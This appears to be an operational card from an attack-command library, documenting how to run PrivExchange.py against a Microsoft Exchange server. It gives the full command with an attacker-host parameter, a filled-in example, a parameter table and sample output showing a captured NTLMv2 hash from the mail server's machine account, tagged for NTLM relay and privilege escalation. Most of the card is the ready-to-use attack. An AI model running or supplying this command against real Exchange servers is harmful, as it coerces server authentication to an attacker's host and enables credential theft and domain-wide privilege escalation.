---
id: 6da7b4f4-20ed-4be0-b0f4-b3348aef97b6
name: privexchange-run-attack
type: command
executor: bash
data: >-
  python privexchange.py -ah $_ATTACKER_IP $_MAIL_SERVER_HOSTNAME -d $_DOMAIN -u
  $_USERNAME -p $_PASSWORD
output: null
created_at: '2023-04-06T03:56:08.022723+00:00'
updated_at: '2023-04-10T20:26:32.381858+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - ntlm-relay
verified: true
validated: true
---

# privexchange-run-attack

## Command

```bash
python privexchange.py -ah $_ATTACKER_IP $_MAIL_SERVER_HOSTNAME -d $_DOMAIN -u $_USERNAME -p $_PASSWORD
```

## Description

Runs PrivExchange.py to coerce Exchange server authentication via EWS push subscriptions, capturing the server's NTLM hash.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ah $_ATTACKER_IP | Attacker host IP | Yes |
| $_MAIL_SERVER_HOSTNAME | Exchange server hostname (e.g., mail01.domain.local) | Yes |
| -d $_DOMAIN | Domain name (e.g., domain.local) | Yes |
| -u $_USERNAME | Username | Yes |
| -p $_PASSWORD | Password | Yes |

## Examples

### Basic Usage

```bash
python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange
```

## Expected Output

[*] Authenticating to EWS...
[*] Subscribing to push...
[*] NTLMv2 Response: $MAIL01$::DOMAIN:...

## Related

- [[procedures/PrivExchange-Attack-with-NTLM-Relay]]
